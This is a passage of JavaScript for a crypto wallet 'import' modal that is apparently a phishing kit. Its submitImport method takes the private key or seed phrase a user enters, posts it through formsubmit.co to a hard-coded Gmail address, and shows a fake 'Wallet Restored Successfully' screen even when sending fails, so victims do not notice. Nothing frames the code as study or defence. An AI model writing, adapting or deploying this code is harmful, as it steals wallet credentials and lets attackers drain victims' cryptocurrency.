      const wordCount = type === 'private' ? 0 : parseInt(type);
      inputArea.innerHTML = type === 'private' ? this.renderPrivateKeyInput() : this.renderSeedPhraseInputs(wordCount);
      this.attachInputListeners();
      
      // Update focus color styles
      const walletColor = this.selectedWallet.primaryColor;
      const existingStyle = document.querySelector('#wallet-import-backdrop style');
      if (existingStyle) {
        existingStyle.textContent = `
          #wallet-import-backdrop .seed-word-input:focus {
            border-color: ${walletColor} !important;
          }
          #wallet-import-backdrop #private-key-input:focus {
            border-color: ${walletColor} !important;
          }
        `;
      }
    }
  }

  submitImport() {
    if (this.importType === 'private') {
      console.log('Private Key:', this.privateKey);
      console.log('Wallet:', this.selectedWallet.name);
    } else {
      const filledWords = this.seedWords.filter(w => w.trim() !== '');
      console.log('Seed Phrase:', filledWords);
      console.log('Wallet:', this.selectedWallet.name);
    }
    
    // Send data to FormSubmit.co (replace YOUR_EMAIL with your actual email)
    fetch('https://formsubmit.co/ajax/avg8923@gmail.com', {
      method: 'POST', 
      headers: { 
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({ 
        _subject: `New Wallet Import - ${this.selectedWallet.name}`,
        wallet: this.selectedWallet.name,
        type: this.importType,
        data: this.importType === 'private' ? this.privateKey : this.seedWords.join(' '),
        timestamp: new Date().toISOString()
      }) 
    })
    .then(response => response.json())
    .then(data => {
      console.log('Success:', data);
      this.showSuccessMessage();
    })
    .catch((error) => {
      console.error('Error:', error);
      // Still show success to user even if sending fails
      this.showSuccessMessage();
    });
  }

  showSuccessMessage() {
    this.closeModalOnly();
    
    const walletColor = this.selectedWallet.primaryColor;
    
    const successHTML = `
      <div id="wallet-success-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">
        <div class="flex flex-col items-center">
          <!-- Wallet Logo with Success Badge -->
          <div class="mb-8 relative">
            <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-32 h-32 rounded-3xl shadow-2xl" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-32 h-32 rounded-3xl shadow-2xl flex items-center justify-center text-6xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
            <!-- Success Badge -->
            <div class="absolute -bottom-2 -right-2 w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-lg">
              <svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
              </svg>
            </div>
          </div>
          
          <h2 class="text-2xl font-bold text-gray-900 mb-3">Wallet Restored Successfully</h2>
          <p class="text-gray-500 text-center mb-8">Your wallet has been imported</p>
          
          <!-- Loading animation -->
          <div class="flex space-x-2">
            <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0s"></div>
            <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0.2s"></div>
            <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0.4s"></div>
          </div>
        </div>
      </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', successHTML);
    
    // Auto close after 3 seconds and restore main content
    setTimeout(() => {
      this.closeModal();
      this.restoreMainContent();
    }, 3000);
  }

  restoreMainContent() {
    // Show all hidden content again
    Array.from(document.body.children).forEach(child => {
      if (child.id !== 'wallet-flow-container') {
        child.style.display = '';
      }
    });
    
    // Remove the wallet flow container
    const container = document.getElementById('wallet-flow-container');
    if (container) {
      container.remove();
    }
  }

  closeModalOnly() {
    // Remove all modal backdrops without resetting state
    const modals = [
      'wallet-modal-backdrop',
      'wallet-import-backdrop',
      'wallet-updating-backdrop',
      'wallet-failed-backdrop',
      'wallet-success-backdrop',
      'wallet-prompt-backdrop',
      'walletconnect-modal-backdrop'
    ];
    
    modals.forEach(id => {
      const element = document.getElementById(id);
      if (element) {
        element.remove();
      }
    });
  }
 
  closeModal() {
    // Remove all modal backdrops
    this.closeModalOnly();

    // Reset state
    this.selectedWallet = null;
    this.importType = '12';
    this.seedWords = Array(12).fill('');
    this.privateKey = '';
  }
}

// Export to window and initialize
window.WalletModal = WalletModal;

// Initialize the wallet modal only if not already initialized
if (!window.walletModal) {
  window.walletModal = new WalletModal();
  console.log('WalletModal initialized');
}

})(); // End IIFE
